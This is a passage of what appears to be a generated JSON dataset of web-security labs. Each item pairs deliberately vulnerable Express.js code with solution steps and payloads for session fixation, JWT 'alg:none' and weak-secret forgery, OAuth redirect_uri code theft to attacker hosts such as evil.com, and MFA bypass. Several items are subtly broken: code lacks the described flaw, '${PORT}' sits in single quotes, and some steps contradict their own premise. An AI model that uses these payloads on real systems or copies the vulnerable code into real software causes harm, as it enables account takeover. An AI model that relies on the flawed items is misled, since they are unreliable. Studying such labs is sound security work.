    "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\napp.get('/oauth/callback', async (req, res) => {\n  const { code, redirect_uri } = req.query;\n  try {\n    const tokenRes = await axios.post('https://oauth-provider/token', {\n      code,\n      redirect_uri\n    });\n    const accessToken = tokenRes.data.access_token;\n    const userInfo = await axios.get('https://oauth-provider/userinfo', {\n      headers: { Authorization: `Bearer ${accessToken}` }\n    });\n    if (userInfo.data.username === 'carlos') {\n      return res.send('Welcome back Carlos');\n    } else {\n      return res.status(403).send('Not Carlos');\n    }\n  } catch (e) {\n    res.status(500).send('OAuth flow error');\n  }\n});\napp.listen(4002, () => console.log('OAuth Open Redirect Lab running on http://localhost:4002'));",
    "payloads": [
      "https://oauth-provider/auth?client_id=lab-client&redirect_uri=https://evil.com/callback",
      "Authorization: Bearer <stolen_token>",
      "Use Repeater to GET /my-account with forged Authorization header"
    ]
  },
  {
    "Lab scenario": "SOAP-based SSO Session Fixation in Login Workflow",
    "Lab Description": "The application uses a SOAP-based Single Sign-On (SSO) authentication mechanism that fails to regenerate the session identifier after login. The application accepts a session cookie before authentication and keeps it post-login. To solve: Hijack an admin user's session by fixing their session ID via a crafted SOAP request and accessing the /admin/dashboard page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP's Intercepting Proxy to capture the initial unauthenticated session identifier by visiting the homepage.",
      "2. Send a crafted SOAP login request using Postman with a manually inserted JSESSIONID from your session in the Cookie header.",
      "3. Wait for the admin to authenticate with the same fixed JSESSIONID, which is reused post-authentication.",
      "4. Reuse the fixed session ID in your own browser's cookie to take over the authenticated admin session.",
      "5. Navigate to /admin/dashboard to verify the hijack and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const soap = require('soap'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); app.use(bodyParser.text({ type: 'text/xml' })); let users = { 'admin': { password: 'supersecret' } }; app.post('/soap-login', (req, res) => { const match = req.body.match(/<username>(.*?)<\\/username>.*<password>(.*?)<\\/password>/); if (!match) return res.status(400).send('Invalid SOAP'); const [_, username, password] = match; if (users[username] && users[username].password === password) { req.session.user = username; console.log('[DEBUG] Session fixed for:', req.sessionID); res.send('<soap:Envelope><soap:Body>Login Success</soap:Body></soap:Envelope>'); } else { res.status(403).send('<soap:Envelope><soap:Body>Login Failed</soap:Body></soap:Envelope>'); } }); app.get('/admin/dashboard', (req, res) => { if (req.session.user === 'admin') res.send('Welcome Admin Dashboard'); else res.status(403).send('Access denied'); }); app.listen(3000, () => console.log('[SOAP SSO Lab] Running on port 3000'));",
    "payloads": [
      "POST /soap-login HTTP/1.1\\nCookie: JSESSIONID=fixed-session-id\\n<username>admin</username><password>supersecret</password>",
      "GET /admin/dashboard with Cookie: JSESSIONID=fixed-session-id"
    ]
  },
  {
    "Lab scenario": "JWT Tampering via Algorithm Confusion in REST API",
    "Lab Description": "The application uses JWTs to authorize users after login, but improperly validates the algorithm field. An attacker can change the algorithm from 'RS256' to 'none' and supply an unsigned token to bypass authentication. To solve: Forge a valid JWT that grants 'admin' privileges and access /admin/flags endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept the JWT issued after login with Burp Suite and note the 'alg' is RS256 and 'kid' is present.",
      "2. Modify the JWT header to change the 'alg' value from RS256 to none and remove the signature.",
      "3. Change the payload 'role':'user' to 'role':'admin' and base64-encode both parts.",
      "4. Resend the tampered JWT using Postman with Authorization: Bearer <your-token> header.",
      "5. Access the /admin/flags endpoint to verify the privilege escalation and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const pubKey = 'fake-public-key'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username, role: 'user' }, pubKey, { algorithm: 'RS256', header: { kid: '1' } }); console.log('[DEBUG] Token issued:', token); res.json({ token }); }); app.get('/admin/flags', (req, res) => { try { const token = req.headers.authorization.split(' ')[1]; const payload = jwt.verify(token, pubKey); if (payload.role === 'admin') return res.send('CTF_FLAG{jwt_admin_bypass}'); else return res.status(403).send('Insufficient role'); } catch (e) { return res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('[JWT Tamper Lab] Listening on port 4000'));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"user\":\"admin\",\"role\":\"admin\"}",
      "Unsigned JWT: base64url(header).base64url(payload)."
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration with Authorization Code Leak via Open Redirect",
    "Lab Description": "The OAuth login flow has a misconfigured redirect_uri that allows open redirection to untrusted domains. An attacker can intercept the authorization code and exchange it for a valid access token. To solve: Steal a victim’s OAuth code and use it to access the /profile endpoint as the victim.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Start OAuth login flow and observe the 'redirect_uri' includes a return parameter vulnerable to open redirection.",
      "2. Craft a malicious redirect_uri that includes your attacker site (e.g., https://attacker.com/steal?code=).",
      "3. Send a phishing link to the victim that starts the OAuth login with your redirect_uri.",
      "4. Capture the stolen authorization code from the redirect to your attacker site.",
      "5. Exchange the code manually using Postman with the /oauth/token endpoint and use the access token to call /profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const users = { carlos: { token: 'user123', profile: 'Carlos Profile Details' } }; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, state } = req.query; const code = 'user123'; console.log('[DEBUG] OAuth issued code:', code); return res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'user123') return res.json({ access_token: 'access-token-carlos' }); res.status(400).send('Invalid code'); }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'access-token-carlos') res.send('Carlos Profile Details'); else res.status(401).send('Unauthorized'); }); app.listen(5000, () => console.log('[OAuth Redirect Lab] Running on port 5000'));",
    "payloads": [
      "https://vulnerable-app.com/oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/steal&response_type=code&state=xyz",
      "POST /oauth/token with {\"code\":\"user123\"}",
      "GET /profile with Authorization: Bearer access-token-carlos"
    ]
  },
  {
    "Lab scenario": "Session Fixation via SOAP API Login Handler",
    "Lab Description": "The SOAP-based authentication flow mishandles session state. The application accepts session IDs from unauthenticated users and preserves them post-login. To solve: hijack a victim's session by pre-setting a session ID and tricking them into using it, then log in yourself using that session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a login request and observe the Set-Cookie header for session ID creation.",
      "2. Send a SOAP request manually to the login handler while injecting a custom PHPSESSID using Burp Repeater.",
      "3. Craft an HTML page that loads the vulnerable endpoint in an invisible iframe while setting the PHPSESSID via document.cookie.",
      "4. Send the link to the victim or simulate a visit by the victim's browser to bind their login to your session.",
      "5. Reuse the same session ID to access the authenticated dashboard and verify the hijacked account access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst cookieParser = require('cookie-parser');\nconst soap = require('soap');\nconst app = express();\napp.use(bodyParser.text());\napp.use(cookieParser());\nconst sessions = {};\nconst users = { carlos: 'hunter2' };\napp.post('/soap-auth', (req, res) => {\n  const parsed = req.body.match(/<username>(.*?)<\\/username>.*<password>(.*?)<\\/password>/);\n  const username = parsed[1];\n  const password = parsed[2];\n  if (users[username] === password) {\n    const sessId = req.cookies.PHPSESSID || `sess_${Math.random()}`;\n    sessions[sessId] = username;\n    res.cookie('PHPSESSID', sessId);\n    res.send(`<loginResponse><message>Welcome ${username}</message></loginResponse>`);\n  } else {\n    res.send('<loginResponse><message>Invalid</message></loginResponse>');\n  }\n});\napp.get('/dashboard', (req, res) => {\n  const user = sessions[req.cookies.PHPSESSID];\n  if (user) {\n    res.send(`Logged in as ${user}`);\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\napp.listen(4000, () => console.log('Session Fixation SOAP Lab running on port 4000'));",
    "payloads": [
      "<html><script>document.cookie='PHPSESSID=fixed-session';</script><iframe src='http://victim.site/soap-auth'></iframe></html>",
      "<Envelope><Body><username>carlos</username><password>hunter2</password></Body></Envelope>",
      "Cookie: PHPSESSID=fixed-session"
    ]
  },
  {
    "Lab scenario": "JWT Algorithm Confusion in GraphQL Login",
    "Lab Description": "The GraphQL authentication service allows JWTs signed with 'none' algorithm. An attacker can forge tokens to impersonate other users. To solve: craft a JWT impersonating 'admin' and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman to send a GraphQL mutation to log in as a user and capture the returned JWT.",
      "2. Decode the JWT and observe the use of the 'alg' header (e.g., HS256).",
      "3. Modify the token header to use 'alg':'none' and set the payload to { \"username\": \"admin\" }.",
      "4. Remove the signature and reassemble the JWT.",
      "5. Use Burp Suite or Postman to send a GraphQL query using the forged JWT in the Authorization header and access the admin data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(bodyParser.json());\nconst secret = 'hardcoded-secret';\napp.post('/graphql', (req, res) => {\n  if (req.body.query.includes('login')) {\n    const token = jwt.sign({ username: req.body.variables.username }, secret, { algorithm: 'HS256' });\n    return res.json({ data: { token } });\n  }\n  const auth = req.headers.authorization?.split(' ')[1];\n  let payload;\n  try {\n    payload = jwt.verify(auth, secret, { algorithms: ['HS256', 'none'] });\n  } catch (e) {\n    return res.status(401).json({ error: 'Invalid token' });\n  }\n  if (payload.username === 'admin') {\n    return res.json({ data: { flag: 'admin_dashboard_access_granted' } });\n  }\n  res.json({ data: { user: payload.username } });\n});\napp.listen(4001, () => console.log('JWT Confusion GraphQL Lab running on port 4001'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "{ query: '{adminDashboard}' }"
    ]
  },

  {
    "Lab scenario": "Session fixation vulnerability via insecure cookie handling in login flow",
    "Lab Description": "The application mishandles session cookies by issuing them before authentication, then reusing them post-login. The vulnerable behavior allows an attacker to fix the session ID for a victim prior to login. To solve: Hijack Carlos's session by forcing him to use a known session ID, then log in and access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Using Burp Suite, visit the login page and capture the Set-Cookie header to observe the issued session ID before login.",
      "2.Use Postman or Burp Repeater to log in to your own account and verify the session ID does not change after login.",
      "3.Generate a session ID and craft a malicious link to send to Carlos with the session ID embedded in a cookie.",
      "4.Trick Carlos into visiting the crafted link to fix the session.",
      "5.Log in as Carlos using known credentials and reuse the fixed session ID to hijack the authenticated session.",
      "6.Access /my-account endpoint using the hijacked session to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); let sessions = {}; let users = [{ username: 'carlos', password: 'carlospass' }]; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substring(2); res.setHeader('Set-Cookie', `session=${sid}; Path=/; HttpOnly`); sessions[sid] = { loggedIn: false }; res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (user && sessions[sid]) { sessions[sid].loggedIn = true; sessions[sid].user = username; res.redirect('/my-account'); } else { res.status(401).send('Invalid'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid] && sessions[sid].loggedIn) { res.send(`Welcome to Carlos's account`); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "GET /login",
      "GET /login with Set-Cookie: session=attackerKnownID",
      "POST /login with Cookie: session=attackerKnownID and body: username=carlos&password=carlospass"
    ]
  },
 
  {
    "Lab scenario": "OAuth 2.0 misconfiguration allows redirect_uri manipulation and code interception",
    "Lab Description": "The application uses OAuth 2.0 for third-party login, but it accepts arbitrary redirect_uris due to improper validation. An attacker can intercept authorization codes meant for Carlos. To solve: Gain access to Carlos’s OAuth account by hijacking his authorization code.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Start OWASP ZAP and configure it as the browser proxy. Navigate to the OAuth login flow and intercept the authorization request URL.",
      "2.Observe that the redirect_uri is not validated and is included in the authorization request as a query parameter.",
      "3.Craft a malicious OAuth login URL with a redirect_uri pointing to your attacker-controlled server (e.g., https://evil.net/intercept).",
      "4.Trick Carlos into clicking the malicious login link. Capture the intercepted code on your server.",
      "5.Exchange the stolen code at the token endpoint and receive an access token for Carlos.",
      "6.Use the access token to call the /userinfo endpoint and access Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, client_id } = req.query; const authCode = 'code-carlos123'; res.redirect(`${redirect_uri}?code=${authCode}`); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'code-carlos123') res.json({ access_token: 'access-token-carlos' }); else res.status(400).send('Invalid code'); }); app.get('/userinfo', (req, res) => { const { authorization } = req.headers; if (authorization === 'Bearer access-token-carlos') res.send('Carlos user profile'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Code Interception Lab running'));",
    "payloads": [
      "https://vulnerable-app.com/auth?client_id=123&redirect_uri=https://evil.net/intercept",
      "Captured code: code-carlos123",
      "POST /token with code=code-carlos123",
      "GET /userinfo with Authorization: Bearer access-token-carlos"
    ]
  },
    {
      "Lab scenario": "JWT Token Tampering in API Authentication",
      "Lab Description": "This lab involves a vulnerable JWT-based authentication system where the token can be tampered with to impersonate a different user. To solve the lab, exploit the vulnerability by modifying the JWT token to impersonate Carlos and access his account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Intercept the API request that sends the JWT token using Burp Suite's Proxy.",
        "2. Decrypt the intercepted JWT token using an online JWT decoder.",
        "3. Modify the 'sub' claim in the token to 'carlos' and re-encode the token.",
        "4. Replace the original token in the HTTP Authorization header with the tampered token.",
        "5. Send the request and observe that you gain access to Carlos's account page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, sub: user.username }, 'secretkey'); res.json({ token }); }); app.get('/account', (req, res) => { const token = req.headers['authorization'].split(' ')[1]; jwt.verify(token, 'secretkey', (err, decoded) => { if (err) return res.status(401).send('Unauthorized'); if (decoded.sub !== 'carlos') return res.status(403).send('Forbidden'); res.send('Welcome, Carlos'); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:${PORT}'));"
    },
    {
      "Lab scenario": "OAuth Misconfiguration Allowing Unauthorized Access",
      "Lab Description": "This lab demonstrates an OAuth misconfiguration where the application allows access to sensitive resources without proper scope validation. To solve the lab, exploit the OAuth misconfiguration by forging an access token with elevated privileges.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Initiate the OAuth flow using Burp Suite and intercept the authorization code request.",
        "2. Manipulate the request to request a higher scope (e.g., 'admin') rather than the default scope.",
        "3. Exchange the manipulated authorization code for an access token.",
        "4. Send the access token in an API request and gain unauthorized access to the admin panel.",
        "5. Verify access to the admin page, confirming successful exploitation."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const { OAuth2Server } = require('oauth2-server'); const app = express(); const oauth = new OAuth2Server({ model: { getAccessToken: (bearerToken) => { return { accessToken: bearerToken, client: { grants: ['authorization_code'] }, user: { username: 'admin' } }; }, getClient: (clientId, clientSecret) => { return { clientId: 'client123', clientSecret: 'secret123', grants: ['authorization_code'] }; } } }); app.post('/oauth/token', oauth.token()); app.get('/admin', oauth.authenticate(), (req, res) => { if (req.user.username === 'admin') { res.send('Admin panel access granted'); } else { res.status(403).send('Forbidden'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:${PORT}'));"
    },
    {
      "Lab scenario": "Session Fixation via Predictable Session ID",
      "Lab Description": "This lab involves a predictable session ID generation mechanism where the attacker can set their own session ID and impersonate an authenticated user. To solve the lab, set the session ID to Carlos's ID and access his account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Log in to your account and capture the session cookie in Burp Suite.",
        "2. Notice that the session ID is a predictable value (e.g., 'user123').",
        "3. Modify the session ID in the cookie to match 'carlos' and send the modified request.",
        "4. Send the modified request to access Carlos's account page.",
        "5. Verify that the page loads, successfully impersonating Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: { password: 'password123', sessionId: 'carlos' } }; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users[username]; if (user && user.password === password) { res.cookie('sessionId', user.sessionId); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { const sessionId = req.cookies.sessionId; const user = Object.keys(users).find(u => users[u].sessionId === sessionId); if (user) { res.send('Welcome to your account, ' + user); } else { res.status(401).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:${PORT}'));"
    },
    {
      "Lab scenario": "JWT Token Manipulation with Secret Disclosure",
      "Lab Description": "This lab involves a JWT vulnerability where an attacker is able to manipulate the JWT token to impersonate a user. The JWT secret key has been accidentally exposed in the application's source code. The goal is to craft a forged JWT token and use it to gain access to the 'admin' page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite's proxy to intercept the login request and capture the JWT token issued for authentication.",
        "2. Inspect the token using a JWT decoder to analyze its structure (Header, Payload, Signature).",
        "3. Identify that the JWT secret is exposed in the source code, allowing you to generate a valid signature.",
        "4. Modify the 'role' in the JWT Payload to 'admin' and re-sign the token using the exposed secret.",
        "5. Replace the original token in the Authorization header with the forged token and resend the request.",
        "6. Verify that you can access the 'admin' page after successfully forging the token."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\nconst secretKey = 'superSecretKey';\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'admin' && password === 'adminpassword') {\n    const token = jwt.sign({ username: 'admin', role: 'user' }, secretKey);\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/admin', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (token) {\n    try {\n      const decoded = jwt.verify(token, secretKey);\n      if (decoded.role === 'admin') {\n        res.send('Welcome Admin');\n      } else {\n        res.status(403).send('Forbidden');\n      }\n    } catch (err) {\n      res.status(401).send('Invalid Token');\n    }\n  } else {\n    res.status(401).send('No Token Provided');\n  }\n});\nconst PORT = 3000;\napp.listen(PORT, () => console.log('JWT Token Manipulation Lab running on http://localhost:' + PORT));"
    },
    {
      "Lab scenario": "Session Fixation Vulnerability in Authentication",
      "Lab Description": "In this lab, an attacker can set the victim's session ID to a known value before they log in, leading to unauthorized access. The goal is to exploit the session fixation vulnerability by forcing a user to authenticate with a predefined session ID.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Intercept the login request with Burp Suite's Proxy and observe the session ID assigned after login.",
        "2. Use the captured session ID to modify the session cookie and inject it into the victim's request.",
        "3. Force the victim to log in by sending them a specially crafted URL with the pre-set session ID.",
        "4. Observe that upon successful login, the victim’s session ID matches the attacker’s pre-defined session.",
        "5. Access the victim's account page by reusing the valid session ID and confirming the successful attack."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\napp.use(session({ secret: 'sessionSecret', resave: false, saveUninitialized: true }));\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user' && password === 'password') {\n    req.session.username = 'user';\n    res.send('Login successful');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/account', (req, res) => {\n  if (req.session.username) {\n    res.send('Account page for ' + req.session.username);\n  } else {\n    res.status(401).send('Not authenticated');\n  }\n});\nconst PORT = 3000;\napp.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));"
    },
    {
      "Lab scenario": "MFA Bypass via Insecure Backup Codes",
      "Lab Description": "In this lab, the backup codes used for Multi-Factor Authentication (MFA) are poorly protected, allowing an attacker to bypass MFA altogether. The attacker can retrieve these backup codes and use them to authenticate without needing the actual second factor.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. During the login attempt, intercept the request with Burp Suite's Proxy and observe the second-factor MFA challenge.",
        "2. Review the backup code generation mechanism in the application's source code or via available documentation.",
        "3. Obtain a set of backup codes by accessing a hidden page or via a brute force attack against the 'forgot backup code' functionality.",
        "4. Use one of the backup codes to bypass the MFA step and successfully log into the account.",
        "5. Verify that you can access the user's account page and complete the lab."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\nconst users = [{ username: 'user', password: 'password123', mfaEnabled: true, backupCodes: ['123456', '654321'] }];\napp.post('/login', (req, res) => {\n  const { username, password, code } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (!user) return res.status(401).send('Invalid credentials');\n  if (user.mfaEnabled && !user.backupCodes.includes(code)) return res.status(403).send('Invalid MFA code');\n  res.send('Login successful');\n});\napp.get('/account', (req, res) => {\n  res.send('Account page for user');\n});\nconst PORT = 3000;\napp.listen(PORT, () => console.log('MFA Bypass Lab running on http://localhost:' + PORT));"
    },
    {
      "Lab scenario": "OAuth Misconfiguration Leading to Privilege Escalation",
      "Lab Description": "This lab demonstrates a misconfigured OAuth flow where an attacker can escalate their privileges by exploiting the application's access control. The attacker can manipulate OAuth tokens to gain unauthorized access to sensitive resources.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Identify the OAuth flow by observing requests with Burp Suite and recognizing the endpoint that issues OAuth tokens.",
        "2. Analyze the OAuth tokens to detect any issues with token scope or privilege limitations.",
        "3. Manipulate the OAuth token parameters (such as scope or user ID) to escalate privileges and gain access to resources that should be restricted.",
        "4. Send the modified token to the server and confirm that you can access privileged information or actions.",
        "5. Verify the successful exploitation by completing the attack and accessing the resource."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express');\nconst app = express();\napp.post('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri, response_type, scope } = req.body;\n  if (client_id === 'trusted-client' && redirect_uri === 'http://localhost/callback') {\n    const token = 'abc123';\n    res.redirect(redirect_uri + '?token=' + token);\n  } else {\n    res.status(400).send('Invalid client');\n  }\n});\napp.post('/api/data', (req, res) => {\n  const token = req.body.token;\n  if (token === 'abc123') {\n    res.json({ data: 'Sensitive data' });\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\nconst PORT = 3000;\napp.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));"
    },
    {
      "Lab scenario": "Session fixation vulnerability in user login",
      "Lab Description": "This lab demonstrates a session fixation vulnerability in a web application. The session ID is not regenerated upon login, which allows an attacker to set a fixed session ID for a target user. To solve this lab, fix a session ID for Carlos and log in to his account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Intercept the login request using Burp Suite and modify the session ID parameter to a custom value before submitting the request.",
        "2. Log in using Carlos’s credentials and ensure the session ID is set to the attacker’s fixed value.",
        "3. Use Burp Suite’s Repeater tool to send the modified session cookie with the fixed session ID to the server.",
        "4. After logging in, access the 'My Account' page to solve the lab and confirm that the session fixation vulnerability allows access to Carlos’s account."
      ],
      "Vulnerability name": "Session Fixation",
      "src code": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); let users = [{ username: 'carlos', password: 'password123' }]; let sessions = {}; app.post('/login', (req, res) => { const { username, password, sessionId } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); sessions[sessionId] = username; res.send('Logged in'); }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.sessionId; const username = sessions[sessionId]; if (username) { res.send(`Account details for ${username}`); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:${PORT}'));",
      "payloads": [
        "POST /login username=carlos&password=password123&sessionId=attackerSessionId",
        "Cookie: sessionId=attackerSessionId"
      ]
    },
    {
      "Lab scenario": "JWT token manipulation to bypass authentication",
      "Lab Description": "In this lab, a web application is vulnerable to JWT token tampering. An attacker can modify the JWT token’s payload to impersonate Carlos and access his account page. The goal is to craft and inject a manipulated JWT to bypass authentication.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Capture the JWT token using Burp Suite while logging in as Carlos.",
        "2. Decode the JWT token using a base64 decoder and inspect the payload to locate user-specific information.",
        "3. Modify the JWT payload to reflect an arbitrary username (e.g., 'admin') and sign the token with a weak secret.",
        "4. Replace the original JWT in the Authorization header with the newly crafted token and submit the request.",
        "5. Verify the access to Carlos's account page with the forged JWT token and solve the lab."
      ],
      "Vulnerability name": "JWT Tampering",
      "src code": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); let users = [{ username: 'carlos', password: 'securepass123' }]; const secret = 'weaksecret'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username }, secret); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; jwt.verify(token, secret, (err, decoded) => { if (err) return res.status(403).send('Forbidden'); res.send(`Account details for ${decoded.username}`); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:${PORT}'));",
      "payloads": [
        "Authorization: Bearer manipulatedJWTToken"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration allowing unauthorized access",
      "Lab Description": "In this lab, OAuth misconfiguration allows unauthorized access to a user's account by exploiting improper token validation. The goal is to use a valid OAuth token to impersonate Carlos and gain access to his account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Intercept the OAuth token request using Burp Suite to obtain the authorization token for Carlos.",
        "2. Inspect the response for the token and extract the access token.",
        "3. Use the token to send a GET request to the /my-account endpoint while impersonating Carlos.",
        "4. Check the response for account details to confirm that the unauthorized access was successful and solve the lab."
      ],
      "Vulnerability name": "OAuth Misconfiguration",
      "src code": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); let users = [{ username: 'carlos', password: 'secretpass', oauthToken: 'validToken123' }]; app.post('/oauth/token', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); res.json({ access_token: user.oauthToken }); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; const user = users.find(u => u.oauthToken === token); if (user) { res.send(`Account details for ${user.username}`); } else { res.status(403).send('Unauthorized access'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:${PORT}'));",
      "payloads": [
        "Authorization: Bearer validToken123"
      ]
    },
    {
      "Lab scenario": "JWT token tampering and impersonation",
      "Lab Description": "In this lab, JWT tokens are used for user authentication. However, the tokens are not properly verified, allowing you to modify the JWT payload to impersonate other users. To solve the lab, impersonate the admin user by modifying a JWT token and access the admin dashboard.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Log in with your own credentials and capture the JWT token in the response using Burp Suite.",
        "2. Decode the JWT token to examine its structure. Identify the signature and payload sections.",
        "3. Use a JWT decoding tool to manipulate the payload. Modify the 'username' field to 'admin'.",
        "4. Re-encode the JWT and send it back in the Authorization header using Burp Suite's Repeater.",
        "5. Access the admin dashboard by navigating to /admin/dashboard using the modified JWT token.",
        "6. Verify that you have successfully accessed the admin panel, confirming that you have impersonated the admin user."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secretKey = 'secret'; const users = [{ username: 'user', password: 'password123' }, { username: 'admin', password: 'admin123' }]; app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username }, secretKey); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const token = req.headers['authorization'].split(' ')[1]; jwt.verify(token, secretKey, (err, decoded) => { if (err || decoded.username !== 'admin') return res.status(403).send('Forbidden'); res.send('Admin dashboard'); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:${PORT}'));",
      "payloads": [
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.d4d3f573a41d99f04793544e3b7f4e17783e7f3f8ef6889b545e428b1aef2b97"
      ]
    },
    {
      "Lab scenario": "Session fixation attack",
